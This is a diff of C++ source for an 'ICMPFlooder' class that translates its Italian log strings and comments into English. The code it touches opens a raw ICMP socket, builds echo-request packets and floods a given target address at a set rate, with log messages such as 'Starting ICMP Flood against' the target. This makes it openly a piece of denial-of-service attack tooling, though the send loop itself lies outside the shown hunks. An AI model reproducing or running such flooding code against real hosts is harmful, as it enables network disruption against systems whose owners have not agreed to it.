@@ -18,11 +18,11 @@ unsigned short ICMPFlooder::calculateChecksum(unsigned short *buf, int nwords) {
 bool ICMPFlooder::initialize() {
     raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if (raw_socket < 0) {
-        Utils::logError("Impossibile creare raw socket ICMP (richiede root)");
+        Utils::logError("Unable to create ICMP raw socket (root required)");
         return false;
     }
     
-    Utils::logSuccess("ICMP Flooder pronto");
+    Utils::logSuccess("ICMP Flooder ready");
     return true;
 }
 
@@ -33,7 +33,7 @@ void ICMPFlooder::flood(const std::string &target, int packets, int rate) {
     dest_addr.sin_family = AF_INET;
     inet_pton(AF_INET, target.c_str(), &dest_addr.sin_addr);
     
-    // Costruisci pacchetto ICMP Echo Request
+    // Build an ICMP Echo Request packet
     char packet[64];
     struct icmphdr *icmp = (struct icmphdr *)packet;
     
@@ -45,7 +45,7 @@ void ICMPFlooder::flood(const std::string &target, int packets, int rate) {
     // Payload
     memset(packet + sizeof(struct icmphdr), 0xA5, sizeof(packet) - sizeof(struct icmphdr));
     
-    Utils::logAttack("Avvio ICMP Flood su " + target + " (" + std::to_string(packets) + " pacchetti)");
+    Utils::logAttack("Starting ICMP Flood against " + target + " (" + std::to_string(packets) + " packets)");
     
     int interval_us = 1000000 / rate; // Microsecondi tra pacchetti
     
@@ -67,5 +67,5 @@ void ICMPFlooder::flood(const std::string &target, int packets, int rate) {
     }
     
     std::cout << std::endl;
-    Utils::logSuccess("ICMP Flood completato");
+    Utils::logSuccess("ICMP Flood completed");
 }
